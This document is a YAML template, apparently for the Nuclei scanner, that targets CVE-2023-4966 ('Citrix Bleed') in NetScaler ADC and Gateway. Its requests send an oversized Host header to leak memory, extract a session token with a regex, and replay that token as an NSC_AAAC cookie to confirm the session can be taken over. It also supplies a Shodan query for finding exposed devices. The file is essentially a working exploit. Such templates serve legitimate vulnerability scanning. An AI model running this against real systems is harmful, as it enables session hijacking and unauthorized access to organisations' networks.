http:
- extractors:
  - group: 1
    internal: true
    name: session
    part: body_1
    regex:
    - ([a-f0-9]{100}45525d5f4f58455e445a4a42)
    type: regex
  - part: body_2
    regex:
    - ([a-z0-9._]+)
    type: regex
  matchers:
  - type: word
    words:
    - NSC_AAAC=
    - HTTP/1.1
  - type: word
    words:
    - '{"issuer":'
  matchers-condition: and
  raw:
  - 'GET /oauth/idp/.well-known/openid-configuration HTTP/1.1

    {{str}}: {{Hostname}}

    Host: {{payload}}


    '
  - 'POST /logon/LogonPoint/Authentication/GetUserName HTTP/1.1

    Host: {{Hostname}}

    Cookie: NSC_AAAC={{session}}


    '
  unsafe: true
id: CVE-2023-4966
info:
  author: DhiyaneshDK
  classification:
    cpe: cpe:2.3:a:citrix:netscaler_application_delivery_controller:*:*:*:*:fips:*:*:*
    cve-id: CVE-2023-4966
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-119,NVD-CWE-noinfo
    epss-percentile: 0.98793
    epss-score: 0.92522
  description: 'Sensitive information disclosure in NetScaler ADC and NetScaler Gateway
    when configured as a Gateway (VPN virtual server, ICA Proxy, CVPN, RDP Proxy)
    or AAA ?virtual?server.

    '
  metadata:
    max-request: 2
    product: netscaler_application_delivery_controller
    shodan-query: title:"Citrix Gateway" || title:"Netscaler Gateway"
    vendor: citrix
    verified: 'true'
  name: Citrix Bleed - Leaking Session Tokens
  reference:
  - https://github.com/assetnote/exploits/blob/main/citrix/CVE-2023-4966/exploit.py
  - https://github.com/Chocapikk/CVE-2023-4966
  - https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966
  - https://x.com/assetnote/status/1716757539323564196?s=20
  - https://www.netscaler.com/blog/news/cve-2023-4966-critical-security-update-now-available-for-netscaler-adc-and-netscaler-gateway/
  severity: high
  tags: cve,cve2023,citrix,adc,info-leak,kev,exposure
variables:
  payload: '{{repeat("a", 24812)}}'
  str: '{{to_lower(rand_text_alpha(4))}}'
